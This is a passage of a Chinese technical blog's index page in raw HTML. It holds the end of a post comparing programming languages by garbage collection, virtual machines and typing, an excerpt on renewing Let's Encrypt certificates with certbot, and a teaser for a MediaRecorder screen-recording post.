<li>无 GC 是指代码必须自行管理申请到的内存并在恰当的时机释放（Rust、C&#x2F;C++）；而有 GC 的语言会通过引用计数（PHP&lt;5.3）、标记复制（V8）等方式定期查找无用的内存进行释放。</li>
<li>标记复制的 GC 的过程通常会引起线程的暂停，也会花费额外的 CPU；但 GC 对于建立高层次的抽象又是必不可少的：异常、闭包等（虽然 C++ 在无 GC 的情况下也实现了这两个特性，但也引入了非常高的复杂度）。</li>
<li>我们认为有 GC 可以简化对内存的管理，建立复杂的抽象；而无 GC 可以得到更底层的对内存的控制，带来更好的性能，避免因为 GC 造成的卡顿。</li>
</ul>
<h2 id="虚拟机-VS-本地代码"><a href="#虚拟机-VS-本地代码" class="headerlink" title="虚拟机 VS. 本地代码"></a>虚拟机 VS. 本地代码</h2><ul>
<li>虚拟机是指在语言和 CPU 之间还有一个用于进行翻译的层次（JavaScript、Java）；无虚拟机是指编译器直接生成本地代码给 CPU 执行（C&#x2F;C++、Golang）。</li>
<li>虚拟机也提供了更为复杂的运行时的动态特性，但这些特性有的时候也可以在没有虚拟机的情况下实现（例如 C++ 的运行时类型识别、Go 的 GC）。</li>
<li>虚拟机可以以解释的方式执行（Python，将代码视作一种数据指令来执行），也可以即时编译（JIT）的方式来执行（V8，先将代码编译到本地代码然后执行），有时也会混合这两种方式（为了更快的启动速度）。</li>
<li>我们认为无虚拟机的语言可以在更低的层次和其他程序交互，同时也天然地有着更好的性能；而有虚拟机的语言则可以轻松地跨平台，针对特定的架构在运行时即时编译出更高性能的代码。</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><table>
<thead>
<tr>
<th>语言</th>
<th>强类型</th>
<th>动态类型</th>
<th>垃圾回收</th>
<th>虚拟机</th>
</tr>
</thead>
<tbody><tr>
<td>C</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>C++</td>
<td>Y</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Java</td>
<td>Y</td>
<td></td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>Python</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>JavaScript</td>
<td></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>PHP</td>
<td></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>Golang</td>
<td>Y</td>
<td></td>
<td>Y</td>
<td></td>
</tr>
<tr>
<td>Rust</td>
<td>Y</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>参考来源：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/19918532">https://www.zhihu.com/question/19918532</a></li>
<li><a target="_blank" rel="noopener" href="http://eli.thegreenplace.net/2006/11/25/a-taxonomy-of-typing-systems/">http://eli.thegreenplace.net/2006/11/25/a-taxonomy-of-typing-systems/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/use-certbot-to-renew-lets-encrypt-certificates/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/use-certbot-to-renew-lets-encrypt-certificates/" itemprop="url">使用 Certbot 更新 Let's Encrypt 证书</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-10T17:38:31+08:00">
                2016-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>Let’s Encrypt 证书即将过期时会给你发送邮件，这个还是比较贴心的。这样也就不会陷入证书过期却没发现的尴尬境地（Let’s Encrypt 的证书只有 90 天的有效期）。</p>
<p><img src="https://img.prin.studio/images/2017/06/11/2826714bc9645e4b9828433b8e674800.png" alt="2826714bc9645e4b9828433b8e674800.png"></p>
<p>以前我写过使用 Certbot 这个工具<a target="_blank" rel="noopener" href="https://prinzeugen.net/use-certbot-to-issue-lets-encrypt-certificates/">申请证书的文章</a>，而同样使用这个工具更新证书只需要一行命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot renew --post-hook &quot;service nginx reload&quot;</span><br></pre></td></tr></table></figure>

<p><code>certbot</code> 这个脚本的位置呀名称啥的自己看着改，对于我来说是 <code>./certbot-auto</code>。加了个钩子可以让它在证书更新更新完毕后重载 Nginx 配置来更新证书。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/use-certbot-to-renew-lets-encrypt-certificates/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/mediarecorder-api-screenflow">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/mediarecorder-api-screenflow" itemprop="url">Using MediaRecorder API for screen recording on the web</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-09T00:05:00+08:00">
                2016-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          Record your webcam and screen using Javascript to create screencast from your browser.
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/mediarecorder-api-screenflow">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/44/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/44/">44</a><span class="page-number current">45</span><a class="page-number" href="/page/46/">46</a><span class="space">&hellip;</span><a class="page-number" href="/page/73/">73</a><a class="extend next" rel="next" href="/page/46/">&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">1451</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">71</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">889</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5358884258"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Laird Lau</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
